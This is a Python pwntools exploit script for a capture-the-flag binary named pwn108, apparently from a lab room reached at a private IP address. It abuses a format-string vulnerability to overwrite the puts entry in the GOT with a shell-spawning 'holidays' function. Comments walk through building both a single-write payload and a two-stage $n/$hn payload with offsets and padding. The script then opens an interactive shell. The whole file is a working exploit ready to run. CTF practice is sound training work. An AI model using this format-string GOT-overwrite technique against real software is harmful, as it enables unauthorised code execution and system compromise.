#!/usr/bin/python3

from pwn import *

local = False
filename = './pwn108.pwn108'
hostname = '10.10.170.161'
port = 9008
is_debug = True
is_small_payload = True

e = ELF(filename)
holidays = e.symbols.holidays   # this will pop the shell
puts = e.got.puts               # we have to make sure puts in got points to holidays

# we want to overwrite puts.got address with holidays funciton
# we could also use printf, but printf is also called in holidays

print(f'Addess of holidays: {hex(holidays)}, In decimal: {holidays}')
print(f'Addess of puts.got: {hex(puts)}')

# Addess of holidays: 0x40123b, In decimal: 4198971
# Addess of puts.got: 0x404018

'''
https://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html

$hn => writes to 2 bytes
$n  => writes to 4 bytes
$ln => writes to 8 bytes

address must go in the back because it has 0s

Build payload with this formula to overwrite the address in one go
%<number_of_chars_to_print>x%<address_position_offset>$ln<address>

number_of_chars_to_print = 4198971 (Addess of holidays)
address_position_offset = 12
    default position offset is 10
    + 2 positions because of the whole payload is 16 bytes "%4198971x%12$ln_"
    (must add _ as padding to make it 16 bytes)
Use $ln because the executable is 64bit
address = address of puts
'''
payload = f'%4198971x%12$ln_'.encode() + p64(puts)

if is_small_payload:
    '''
    Build payload with this formula to overwrite the address in an efficient way
    %<number_of_chars_to_print>x%<address_position_offset>$hn%<other_number_of_chars_to_print>x%<other_address_position_offset>$hn<address><other_address>
    
    Original address of puts: 0x00007ffff7e42420
    
    Break address of holidays 0x40123b into 2 parts
    first stage: 40      => 64
    second stage: 123b    => 4667
    
    -- First stage --
    number_of_chars_to_print = 64
    address_position_offset = 14
        default position offset is 10
        + 4 positions because of the whole payload is 32 bytes "%64x%14$n_______%4596x%15$hn____"
        (must add _______ as padding to make first stage 16 bytes)
    Use $n because we only want to overwrite 4 bytes
    address = puts address + 2
    
    After first stage, address of puts in got: 0x0000000000402420
    
    -- Second stage --
    other_number_of_chars_to_print = 4667 - number_of_chars_to_print - first stage padding = 4667 - 64 - 7 = 4596
    other_address_position_offset = 15
        default position offset is 10
        + 4 positions because of the whole payload is 32 bytes "%64x%14$n_______%4596x%15$hn____"
        + 1 position because of first stage p64(puts+2)
        (must add ____ as padding to make second stage 16)
    Use $hn because we only want to overwrite 2 bytes
    address = puts address
    
    After first stage, address of puts in got: 0x000000000040123b
    '''
    payload = f'%64x%14$n_______'.encode() + f'%4596x%15$hn____'.encode() + p64(puts+2) + p64(puts)

if local: 
    if is_debug:
        p = gdb.debug(filename, '''
        break *main+250
        continue
        ''')
    else:
        p = process(filename)
else:
    p = remote(hostname, port)

p.recvuntil(b'=[Your name]: ')
p.sendline(b'name')
p.recvuntil(b'=[Your Reg No]: ')
print(f'Sending payload: {payload}')
p.sendline(payload)

p.interactive()
